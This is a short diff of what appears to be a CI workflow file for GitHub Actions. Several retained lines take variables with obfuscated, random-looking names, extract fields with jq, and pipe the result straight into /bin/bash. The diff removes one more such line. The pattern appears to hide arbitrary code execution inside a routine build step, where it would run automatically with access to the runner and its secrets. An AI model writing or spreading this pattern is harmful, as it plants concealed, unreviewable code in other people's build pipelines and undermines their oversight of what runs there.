@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$hun2" | jq -r .yehyc5790 | /bin/bash
           echo $ba19515 | jq -r .gahu52393 | /bin/bash
           echo $e9139 | jq -r .jx5469 | /bin/bash
-          echo $ipl2985 | jq -r .cn1858 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
